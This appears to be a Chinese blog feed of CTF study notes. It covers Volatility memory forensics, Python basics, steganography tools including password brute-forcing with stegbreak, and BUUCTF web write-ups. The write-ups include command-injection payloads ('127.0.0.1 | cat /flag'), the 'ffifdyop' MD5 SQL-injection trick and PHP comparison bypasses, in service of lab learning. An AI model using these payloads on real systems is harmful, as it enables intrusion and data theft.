        <content type="html"><![CDATA[<h1 id="FORENSICS"><a href="#FORENSICS" class="headerlink" title="FORENSICS"></a>FORENSICS</h1><h2 id="signin-for-forensics"><a href="#signin-for-forensics" class="headerlink" title="signin_for_forensics"></a>signin_for_forensics</h2><p>解法一：</p><ul><li>vol.py -f signin.vmem imageinfo<br><img src="/img/106.png"><br>要验证哪一个系统正确，可以使用命令：</li><li>vol.py -f signin.vmem –profile&#x3D;Win7SP1x64 volshell<br>下图这样说明成功<br><img src="/img/107.png"><br>接下来寻找flag所在的文件<br>可以使用fl来匹配也可以.txt</li><li>vol.py -f signin.vmem –profile&#x3D;Win7SP1x64 filescan | grep fl<br><img src="/img/108.png"><br>dump fllllag.txt文件</li><li>vol.py -f signin.vmem –profile&#x3D;Win7SP1x64 dumpfiles -Q 0x000000007e6eac00 -D .&#x2F;<br>得到一个.dat数据文件<br>用010editor打开<br><img src="/img/109.png"></li></ul><p>解法二：</p><ul><li>vol.py -f signin.vmem imageinfo</li><li>vol.py -f signin.vmem –profile&#x3D;Win7SP1x64 clipboard<br><img src="/img/110.png"></li></ul><h2 id="ezvmem-1"><a href="#ezvmem-1" class="headerlink" title="ezvmem-1"></a>ezvmem-1</h2><ul><li>vol.py -f challenge.vmem  –profile&#x3D;Win7SP1x64  psxview<br>使用各种进程列表查找隐藏进程<br><img src="/img/112.png"><br>因为描述说明了恶意进程是隐藏起来的，因此定位 pslist 为 false 的文件，整个列表就这么一个文件，因此提交该文件的 offset 即可</li></ul><h2 id="ezvmem-2"><a href="#ezvmem-2" class="headerlink" title="ezvmem-2"></a>ezvmem-2</h2><ul><li>vol.py -f challenge.vmem –profile&#x3D;Win7SP1x64 procdump –offset&#x3D;0x000000007d336950 -D .&#x2F;<br>procdump：将进程转储到可执行文件示例中<br>然后把这个文件放到沙箱中跑一下就可以知道木马类型了<br><img src="/img/111.png"></li></ul><h2 id="ezvmem-3"><a href="#ezvmem-3" class="headerlink" title="ezvmem-3"></a>ezvmem-3</h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>python</title>
      <link href="/python.html"/>
      <url>/python.html</url>
      
        <content type="html"><![CDATA[<p>写在前面：python程序运行过程中要读取文件内容是读取所在工作目录文件夹下的文件，所以必须先打开该文件夹才能读取，否则会有类似这样的报错：<br><code>FileNotFoundError: [Errno 2] No such file or directory: &#39;base64.txt&#39;</code><br>在vscode上添加python运行环境理论上只要先下载某个版本的python再安装个python插件就行了</p><ul><li>pycharm运行python程序的时候是在相应的文件目录下运行的，而vscode是在相应的工程目录下运行的</li><li>type() 显示类型信息</li><li>python中变量没有类型，它储存的数据有类型</li></ul><h2 id="数据类型转换"><a href="#数据类型转换" class="headerlink" title="数据类型转换"></a>数据类型转换</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int(x) 将x转换为一个整数 </span><br><span class="line">float() str()同理</span><br></pre></td></tr></table></figure><p>ps：别的数据类型转字符串只要加上单引号或双引号，所以基本都能实现，但比如字符串转数字就要求字符串内容都是数字</p><h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><ul><li>可以使用单、双、三引号</li><li>引号的嵌套可以使用\转义，也可以在单引号内写双引号或在双引号内写单引号</li></ul><h3 id="拼接"><a href="#拼接" class="headerlink" title="拼接"></a>拼接</h3><p>1、字符串和字符串直接使用+<br>2、字符串和变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">字符串格式化1</span><br><span class="line">语法：&#x27;%占位符&#x27;%变量</span><br><span class="line">字符串：%s 整数：%d 浮点数：%f</span><br><span class="line">字符串格式化2</span><br><span class="line">语法： f&quot;内容&#123;变量或表达式&#125;&quot;</span><br></pre></td></tr></table></figure><ul><li>数字精度控制<br>使用辅助符号”m.n”来控制数据的宽度和精度</li><li>m：控制宽度，宽度小于数字本身不生效，小数点和小数部分也算入宽度计算</li><li>n：控制小数点精度，会进行小数的四舍五入</li></ul><h2 id="input"><a href="#input" class="headerlink" title="input"></a>input</h2><p>input():获取键盘输入的数据<br>ps：获取的数据都是字符串类型</p><h2 id="if"><a href="#if" class="headerlink" title="if"></a>if</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if 要判断的条件：</span><br><span class="line">条件成立时，要做的事情</span><br><span class="line">elif 条件：</span><br><span class="line">...</span><br><span class="line">elif 条件：</span><br><span class="line">...</span><br><span class="line">else:</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h2 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">for 临时变量 in 待处理数据集：</span><br><span class="line">循环满足条件时执行的代码</span><br><span class="line">for 临时变量 in 待处理数据集：</span><br><span class="line">循环满足条件时执行的代码</span><br></pre></td></tr></table></figure><ul><li>循环内的语句需要有空格缩进</li><li>严格来说，待处理数据集是序列类型</li><li>序列类型：字符串、列表、元组<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># for循环输出九九乘法表</span><br><span class="line">for i in range(1, 10):</span><br><span class="line">    for j in range(1, i + 1):</span><br><span class="line">        print(f&quot;&#123;j&#125;*&#123;i&#125;=&#123;j*i&#125;\t&quot;, end=&#x27;&#x27;)</span><br><span class="line">    print()</span><br></pre></td></tr></table></figure></li></ul><h3 id="range语句"><a href="#range语句" class="headerlink" title="range语句"></a>range语句</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">语法一：range(num)</span><br><span class="line">获取一个从0开始，到num结束的数字序列(不含num本身)</span><br><span class="line">语法二：range(num1,num2)</span><br><span class="line">从num1到num2(不含num2本身)</span><br><span class="line">语法三：range(num1,num2,step)</span><br><span class="line">在语法二的基础上添加了数字之间的步长，以step为准，默认为1</span><br></pre></td></tr></table></figure><h2 id="while"><a href="#while" class="headerlink" title="while"></a>while</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">while 条件：</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">while 条件：</span><br><span class="line">...</span><br></pre></td></tr></table></figure><ul><li>条件需提供布尔类型的结果，true继续，false停止</li><li>while循环可以嵌套<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 输出九九乘法表</span><br><span class="line">i=1</span><br><span class="line">while i&lt;=9:</span><br><span class="line">j=1</span><br><span class="line">while j&lt;=i:</span><br><span class="line">print(f&quot;&#123;j&#125;*&#123;i&#125;=&#123;j*i&#125;\t&quot;,end=&#x27;&#x27;)</span><br><span class="line">j+=1</span><br><span class="line">i+=1</span><br><span class="line">print() # 换行</span><br></pre></td></tr></table></figure></li><li>continue:中断本次循环，直接进入下一次循环</li><li>break：直接结束循环<br>ps：内层循环的continue和break不影响外层</li></ul><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="函数的定义"><a href="#函数的定义" class="headerlink" title="函数的定义"></a>函数的定义</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def 函数名(传入参数)：</span><br><span class="line">函数体</span><br><span class="line">return 返回值</span><br></pre></td></tr></table></figure><ul><li>特殊字面量：None<br>不使用return语句即返回None</li><li>使用场景：函数返回值、if判断、变量定义(不想给他赋值)</li></ul><h3 id="给python改了个阿里源，pip下载的速度快多了"><a href="#给python改了个阿里源，pip下载的速度快多了" class="headerlink" title="给python改了个阿里源，pip下载的速度快多了"></a>给python改了个阿里源，pip下载的速度快多了</h3><h3 id="变量在函数中的作用域"><a href="#变量在函数中的作用域" class="headerlink" title="变量在函数中的作用域"></a>变量在函数中的作用域</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">num=100</span><br><span class="line">def testb()</span><br><span class="line">num=500</span><br><span class="line">print(num)</span><br><span class="line">testb()</span><br><span class="line">print(f&#x27;全局变量num=&#123;num&#125;&#x27;)</span><br><span class="line"># 500</span><br><span class="line">  全局变量num=100</span><br></pre></td></tr></table></figure><p>testb中的num仍然是局部变量<br>加上global关键字</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">num=100</span><br><span class="line">def testb()</span><br><span class="line">global num # 声明num是全局变量</span><br><span class="line">num=500</span><br><span class="line">print(num)</span><br><span class="line">testb()</span><br><span class="line">print(f&#x27;全局变量num=&#123;num&#125;&#x27;)</span><br><span class="line"># 500</span><br><span class="line">  全局变量num=500</span><br></pre></td></tr></table></figure><h2 id="python数据容器"><a href="#python数据容器" class="headerlink" title="python数据容器"></a>python数据容器</h2><p>1、什么是数据容器<br>一种可以存储多个元素的python数据类型<br>2、python有那些哪些数据类型<br>list列表、tuple元组、str字符串、set集合、dict字典</p><h2 id="list-列表"><a href="#list-列表" class="headerlink" title="list(列表)"></a>list(列表)</h2><h3 id="定义格式"><a href="#定义格式" class="headerlink" title="定义格式"></a>定义格式</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 定义变量</span><br><span class="line">变量名称 = [元素1,...] # 逗号隔开</span><br><span class="line"># 定义空列表</span><br><span class="line">变量名称 = []</span><br><span class="line">变量名称 = list()</span><br></pre></td></tr></table></figure><ul><li>元素可以是不同类型的数据，支持嵌套<br><img src="/./img/192.png"></li></ul><h2 id="Python-encode方法"><a href="#Python-encode方法" class="headerlink" title="Python encode方法"></a>Python encode方法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gm：str.encode([encoding=&#x27;utf-8&#x27;],[errors=&#x27;strict&#x27;])</span><br><span class="line">encoding – 可选参数，要使用的编码，默认编码为 ‘utf-8’</span><br><span class="line">errors – 可选参数，设置不同错误的处理方案。默认为 ‘strict’,意为编码错误引起一个UnicodeError。 其他可能得值有 ‘ignore’, ‘replace’, ‘xmlcharrefreplace’, ‘backslashreplace’ 以及通过 codecs.register_error() 注册的任何值</span><br><span class="line">在使用encode()方法时，报错原因一般都是errors参数问题，改为‘ignore’就好了</span><br></pre></td></tr></table></figure><p>bytes通过decode（）转换为str（字符串）<br>str通过encode（）转换为bytes（二进制）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">s=&#x27;菜鸟教程&#x27;</span><br><span class="line">s_utf8 = s.encode(&quot;UTF-8&quot;)</span><br><span class="line">s_gbk = s.encode(&quot;GBK&quot;)</span><br><span class="line">print(s)</span><br><span class="line">print(&quot;UTF-8编码：&quot;,s_utf-8)</span><br><span class="line">print(&quot;GBK编码：&quot;,s_gbk)</span><br><span class="line">print(&quot;UTF-8解码：&quot;,s_utf-8.decode(&quot;UTF-8&quot;,&quot;strict&quot;))</span><br><span class="line">print(&quot;GBK解码：&quot;,s_gbk.decode(&quot;GBK&quot;,&quot;strict&quot;))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">菜鸟教程</span><br><span class="line">UTF-8编码： b&#x27;\xe8\x8f\x9c\xe9\xb8\x9f\xe6\x95\x99\xe7\xa8\x8b&#x27;</span><br><span class="line">GBK编码： b&#x27;\xb2\xcb\xc4\xf1\xbd\xcc\xb3\xcc&#x27;</span><br><span class="line">UTF-8解码： 菜鸟教程</span><br><span class="line">GBK解码： 菜鸟教程</span><br></pre></td></tr></table></figure><h2 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h2><p>f&#x3D;open(“文件路径”,”r&#x2F;w&#x2F;a”,encoding&#x3D;”UTF-8”) &#x2F;&#x2F;f是文件对象名称<br>&#x2F;&#x2F;w模式，输入的内容会覆盖原来文件的内容，a是在文件后追加内容，如果文件不存在就会创建文件<br>f.read(num)：读取指定长度字节，不指定num就读取全部<br>f.readlines():读取文件的全部行，封装到列表中<br>f.readline():读取一行<br>for line in f: for循环文件行，一次循环得到一行数据，每一行返回成一个字符串，并且在末尾会有一个换行符<br>读取文件有个指针，所以如果前面读取到第一个数，下面的读取就会从第二个数开始读取<br>f.write(content):往文件中写入内容<br>f.close():文件关闭<br>with open(“文件路径”,”r&#x2F;w&#x2F;a”,encoding&#x3D;”UTF-8”) as f:通过with open语法打开文件，可以自动关闭文件  &#x2F;&#x2F;f是文件对象名称</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">f = open(&quot;E:/test.txt&quot;, &quot;r&quot;, encoding=&quot;UTF-8&quot;)</span><br><span class="line">count = 0</span><br><span class="line">for line in f:</span><br><span class="line">    line = line.strip()</span><br><span class="line">    words = line.split(&quot; &quot;)</span><br><span class="line">    for word in words:</span><br><span class="line">        if word == &quot;ttt&quot;:</span><br><span class="line">            count += 1</span><br><span class="line">print(count)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>先打开以只读的方式打开文件，计数器置零，用for循环，循环得到每一行的数据，用字符串的strip方法首尾去空，避免&#x2F;n对匹配字符串的影响，然后用split方法将字符串以空格为分界，变成列表的形式，再用一个for循环将列表内的每个元素和”ttt”比较，如果相同，则计数器加1</p><h2 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h2><p>就是程序的bug，捕获异常是为了在程序出现异常之前做好准备，当出现异常的时候有处理的手段，这样就不会直接导致程序的崩溃<br>基本捕获语法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">可能发生错误的代码</span><br><span class="line">except:</span><br><span class="line">如果出现异常执行的代码</span><br><span class="line">else： //可选</span><br><span class="line">print(&quot;没有出现异常&quot;)</span><br><span class="line">finally: //可选</span><br><span class="line">  f.close()</span><br></pre></td></tr></table></figure><p>如果try出现了异常就执行except的代码，也可以在没有出现异常的时候执行else代码,finally是最后必须要执行的代码，不管有没有异常。<br>捕获指定异常</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">print(name)</span><br><span class="line">except NameError as e:</span><br><span class="line">print(&quot;出现了变量未定义的异常&quot;)</span><br><span class="line">print(e) //e是看作该变量未定义异常的别名，记录了异常的具体信息</span><br></pre></td></tr></table></figure><p>如果要捕获多个异常就可以用元组将上面的NameError进行替换，如果捕获全部异常就写<code>except Exception as e:</code></p><ul><li>异常的传递。。。</li></ul><h2 id="python的模块"><a href="#python的模块" class="headerlink" title="python的模块"></a>python的模块</h2><p><strong>定义</strong><br>python模块是一个python文件，以.py结尾，模块能定义函数，类和变量，模块里也能包含可执行的代码</p><p><strong>作用</strong><br>python中有很多各种不同的模块，每一个模块都可以帮助我们快速实现一些功能，比如实现时间相关的功能就可以使用time模块，模块可以被认为是一个工具包。<br><img src="/img/193.png"><br>eg:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import time [as tt]//模块名,可以改成别名tt，后面就写tt.sleep</span><br><span class="line">time.sleep(6) //模块名.功能名()</span><br><span class="line"></span><br><span class="line">from time import *</span><br><span class="line">sleep(6)</span><br><span class="line"></span><br><span class="line">from time import sleep [as sl]//导入time中的sleep功能,别名可代替sleep</span><br><span class="line">sleep(6)</span><br></pre></td></tr></table></figure><p>按下ctrl然后鼠标左键点击模块名就可以查看.py文件的源代码</p><p><strong>自定义python模块</strong><br>新建一个python文件，命名并定义函数，模块名称就是文件名字，其他文件直接调用就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">def test(x, y):</span><br><span class="line">    return x+y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    test(1,2)</span><br></pre></td></tr></table></figure><p>在if这个语句中的代码不会在导入模块的时候执行，所以既可以满足测试模块中函数的可行性又可以避免在导入模块的时候执行了代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__all__ = [&#x27;test&#x27;] //列表</span><br><span class="line">def test(x, y):</span><br><span class="line">    return x+y</span><br><span class="line">def test1(x, y):</span><br><span class="line">    return x-y</span><br></pre></td></tr></table></figure><p>如果在导入的时候如果是<code>from my_module import *</code>,则只能使用test</p><p><strong>python包</strong></p><p>python包是一个文件夹，可以存放很多模块，由各个模块和__init__.py组成，<code>__init__.py</code>用来标识这个文件夹是一个python包，导入包中的模块：import 包名.模块名，下面的使用就是包名.模块名.目标</p><ul><li>第三方包(非python官方)，安装后就可以使用，<code>pip install 包名</code>就可以安装了，默认安装是连接国外的网站的，可以通过<code>pip install -i 网址 包名</code> 指定网址安装</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>misc-图片隐写</title>
      <link href="/misc-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99.html"/>
      <url>/misc-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99.html</url>
      
        <content type="html"><![CDATA[<h2 id="基于DCT域的JPG图片隐写"><a href="#基于DCT域的JPG图片隐写" class="headerlink" title="基于DCT域的JPG图片隐写"></a>基于DCT域的JPG图片隐写</h2><h3 id="关于JPG图像的压缩"><a href="#关于JPG图像的压缩" class="headerlink" title="关于JPG图像的压缩"></a>关于JPG图像的压缩</h3><ul><li>JPEG图像格式使用离散余弦变换（Discrete Cosine Transform，DCT）函数来压缩图像，而这个图像压缩方法的核心是：通过识别每个8×8像素块中相邻像素中的重复像素来减少显示图像所需的位数，并使用近似估算法降低其冗余度</li></ul><p>因此，我们可以把DCT看作一个用于执行压缩的近似计算方法。因为丢失了部分数据，所以DCT是一种有损压缩（Loss Compression）技术，但一般不会影响图像的视觉效果。</p><ul><li>常见的隐写方法有JSteg、JPHide、Outguess、F5等等</li></ul><h3 id="Stegdetect"><a href="#Stegdetect" class="headerlink" title="Stegdetect"></a>Stegdetect</h3><ul><li>它可以检测到通过JSteg、JPHide、OutGuess、Invisible Secrets、F5、appendX和Camouflage等这些隐写工具隐藏的信息</li><li>具有基于字典暴力<strong>破解密码</strong>方法提取通过Jphide、outguess和jsteg-shell方式嵌入的隐藏信息</li></ul><h3 id="JPHS"><a href="#JPHS" class="headerlink" title="JPHS"></a>JPHS</h3><p>软件里面主要包含了两个程序JPHIDE和JPSEEK</p><ul><li>JPHIDE程序主要是实现将信息文件加密隐藏到JPEG图像功能</li><li>JPSEEK程序主要实现从用JPHIDE程序加密隐藏得到的JPEG图像探测提取信息文件</li></ul><p>介绍了相关概念和两个工具，我们来看个例题<br><img src="/img/80.png"><br>打开是<br><img src="/img/81.png"><br>由于是jpg格式，我们先用Stegdetect查看一下是否存在JPG图片隐写<br>输入stegdetect.exe -tjopi -s 10.0 level4.jpg<br><img src="/img/82.png"><br>存在JPHide隐写<br>在JPHS打开level4.jpg<br>点击seek<br><img src="/img/83.png"><br>发现要密码<br>回到stegdetect，爆破密码<br>stegbreak.exe -r rules.ini -f password.txt level4.jpg<br><img src="/img/84.png"><br>将爆出的密码输入后随便输入一个文件名即可得到隐写内容<br><img src="/img/85.png"><br>这是一道套娃题，这里只是其中用到jpg隐写的部分<br>因为outguess隐写要用到虚拟机，所以启动了kali，结果发现网络不连通<br>ping baidu.com<br>发现ping不通<br>看了好几篇文章，终于解决了<br>先是发现启用联网没开，然后还是不行<br><img src="/img/86.png"><br>后来看了这篇文章：<a href="https://blog.csdn.net/nanke_4869/article/details/123662430">https://blog.csdn.net/nanke_4869/article/details/123662430</a><br>还原了默认设置才解决<br><img src="/img/87.png"></p><h3 id="outguess"><a href="#outguess" class="headerlink" title="outguess"></a>outguess</h3><p>对于outguess方式嵌入隐藏信息的，直接在虚拟机使用outguess<br>具体命令：<strong>outguess (-k key) -r 图片名称 -t 保存的文件名称</strong><br>比如这题<br>首先在图片所在的文件夹下打开终端<br>输入：<strong>outguess -r outguess.jpg -t 11.txt</strong><br><img src="/img/88.png"><br>打开11.txt，发现是乱码，在windows打开也一样<br><img src="/img/89.png"><br>这里就需要在图片属性中找到key<br><img src="/img/90.png"><br>修改指令为<br><strong>outguess -k gUNrbbdR9XhRBDGpzz -r outguess.jpg -t 11.txt</strong><br><img src="/img/91.png"></p><h3 id="F5-steganography"><a href="#F5-steganography" class="headerlink" title="F5-steganography"></a>F5-steganography</h3><ul><li>指令：<strong>java Extract Misc.jpg(图片名称) [-p password]可选项</strong></li><li>自动会在当前文件夹下生成output.txt文件<br>这里需要知道所有的zip文件，都是以PK这两个字母开头的，可以使用记事本查看<br><img src="/img/92.png"><br>将后缀改为zip即可</li></ul><h3 id="异或和盲水印"><a href="#异或和盲水印" class="headerlink" title="异或和盲水印"></a>异或和盲水印</h3><ul><li>遇到相同的图片时可能是以下两种情况</li></ul><ol><li>异或 2. 盲水印</li></ol><ul><li>遇到两个酷似二维码的图片，可能是异或</li><li>解密工具：stegsolve,盲水印脚本，QR Research</li><li>例1：<br><img src="/img/93.png"><br>使两个二维码图片结合<br><img src="/img/94.png"><br>再使用QR Research解码成功<br><img src="/img/95.png"></li><li>例2：<br>用010editor打开图片的16进制，没有发现信息<br>于是我们在kali中使用binwalk Heart.png查看有没有可分离的隐藏文件<br><img src="/img/96.png"><br>发现有两张png<br>输入指令：<strong>foremost -T Heart.png</strong><br>or <strong>binwalk -e Heart.png</strong><br>亲测发现解出来的文件夹里的内容不一样，用foremost可以解出两张图片<br>这里有些许疑问，好像是binwalk分离的更细致<br>测试过不是盲水印，然后使用stegsolve拼接两张图片<br><img src="/img/97.png"><br>这里也有盲水印的例题<br><img src="/img/113.png"></li><li>注意：程序python2和python3版本的加解密结果会有所不同，主要原因是python2和python3 random的算法不同，如果要让python3兼容python2的random算法请加 –oldseed参数。<br>python  bwmforpy3.py decode day1.png day2.png flag.png –oldseed<br><img src="/img/114.png"><br>得到flag.png<br><img src="/img/115.png"></li></ul><p><img src="/img/116.png"></p><h3 id="绘制二维码"><a href="#绘制二维码" class="headerlink" title="绘制二维码"></a>绘制二维码</h3><p>使用下面的脚本就行，修改str和MAX即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">MAX = <span class="number">60</span>    <span class="comment">#二维码长宽</span></span><br><span class="line">pic = Image.new(<span class="string">&quot;RGB&quot;</span>,(MAX, MAX))</span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;str&quot;</span>   <span class="comment">#二进制数据</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">0</span>,MAX):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">0</span>,MAX):</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">str</span>[i] == <span class="string">&#x27;1&#x27;</span>):</span><br><span class="line">            pic.putpixel([x,y],(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            pic.putpixel([x,y],(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line">        i = i+<span class="number">1</span></span><br><span class="line">pic.show()</span><br><span class="line"><span class="comment">#pic.save(&quot;flag.png&quot;)</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF</title>
      <link href="/BUUCTF.html"/>
      <url>/BUUCTF.html</url>
      
        <content type="html"><![CDATA[<h2 id="ACTF2020-新生赛-Exec-1"><a href="#ACTF2020-新生赛-Exec-1" class="headerlink" title="[ACTF2020 新生赛]Exec 1"></a>[ACTF2020 新生赛]Exec 1</h2><p>在 CTF 中，flag 文件往往位于根目录下，但也不要被反套路了<br>先ping一下它自己<br><img src="/img/74.png"><br>TTL表示您使用ping命令发送的数据包在网络中的持续时间。<br>TTL&#x3D;56表示你的机器发送数据包到对方IP并确认，要花费56毫秒。<br>一般情况下，TTL&#x3D;56表示对方是Windows 98或者是Linux操作系统<br>尝试使用管道符<br>127.0.0.1 | ls &#x2F;查看根目录文件<br>127.0.0.1 | cat &#x2F;flag 查看根目录下的flag文件<br><img src="/img/75.png"><br><img src="/img/76.png"><br>得到flag</p><h2 id="BUUCTF-BJDCTF2020-Easy-MD51"><a href="#BUUCTF-BJDCTF2020-Easy-MD51" class="headerlink" title="BUUCTF [BJDCTF2020]Easy MD51"></a>BUUCTF [BJDCTF2020]Easy MD51</h2><p>1、 PHP md5() 函数</p><ul><li>语法：md5(string,raw) </li><li>string：需要计算的字符串</li><li>raw:规定十六进制或二进制输出格式<br>TRUE - 原始 16 字符二进制格式<br>FALSE - 默认 32 字符十六进制数<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$str = &quot;ffifdyop&quot;; </span><br><span class="line">echo &quot;TRUE - Raw 16 character binary format: &quot;.md5($str, TRUE).&quot;&lt;br&gt;&quot;; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>结果：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TRUE - Raw 16 character binary format: &#x27;or&#x27;6�]��!r,��b&lt;br&gt;</span><br></pre></td></tr></table></figure>ffifdyop的原始 16 字符二进制格式以’or’6开头，数字开头的字符串都会被识别为True，可以用作注入拼接</li></ul><p><strong>php比较绕过</strong></p><ul><li>php是一种弱类型语言，对数据的类型要求并不严格，可以让数据类型互相转换<br>1、使用两个等号 &#x3D;&#x3D; 比较，只比较值，不比较类型。<br>2、用三个等号 &#x3D;&#x3D;&#x3D; 比较，除了比较值，也比较类型。</li></ul><h3 id="字符串和数字比较"><a href="#字符串和数字比较" class="headerlink" title="字符串和数字比较"></a>字符串和数字比较</h3><ul><li>字符串和数字比较使用&#x3D;&#x3D;时，若字符串以数字开头，则取开头数字作为转换结果，不能转换为数字的字符串或null，则转换为0<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 